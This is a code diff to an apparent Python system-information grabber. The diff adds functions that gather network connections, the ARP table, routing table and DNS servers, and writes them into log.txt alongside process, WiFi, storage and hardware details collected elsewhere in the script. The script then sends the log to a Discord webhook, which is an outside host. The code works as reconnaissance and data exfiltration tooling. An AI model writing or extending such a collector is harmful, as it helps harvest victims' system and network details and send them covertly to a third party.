@@ -111,6 +111,26 @@ def get_running_processes():
     processes = execute_command('ps aux')
     return processes
 
+# Function to get network connections
+def get_network_connections():
+    connections = execute_command('netstat -tuln')
+    return connections
+
+# Function to get ARP table
+def get_arp_table():
+    arp_table = execute_command('arp -a')
+    return arp_table
+
+# Function to get routing table
+def get_routing_table():
+    routing_table = execute_command('ip route')
+    return routing_table
+
+# Function to get DNS server information
+def get_dns_servers():
+    dns_servers = execute_command('cat /etc/resolv.conf | grep nameserver')
+    return dns_servers
+
 # Collect detailed network, WiFi, and device information
 network_info = get_network_info()
 wifi_details = get_wifi_details()
@@ -121,6 +141,10 @@ storage_info = get_storage_info()
 memory_info = get_memory_info()
 cpu_info = get_cpu_info()
 running_processes = get_running_processes()
+network_connections = get_network_connections()
+arp_table = get_arp_table()
+routing_table = get_routing_table()
+dns_servers = get_dns_servers()
 
 # Write collected information to log.txt
 log_file_path = 'log.txt'
@@ -170,6 +194,18 @@ with open(log_file_path, 'w') as f:
 
     f.write("=== Running Processes ===\n")
     f.write(f"{running_processes}\n")
+
+    f.write("=== Network Connections ===\n")
+    f.write(f"{network_connections}\n")
+
+    f.write("=== ARP Table ===\n")
+    f.write(f"{arp_table}\n")
+
+    f.write("=== Routing Table ===\n")
+    f.write(f"{routing_table}\n")
+
+    f.write("=== DNS Servers ===\n")
+    f.write(f"{dns_servers}\n")
 
 # Send log.txt content to Discord webhook
 send_to_discord(log_file_path)
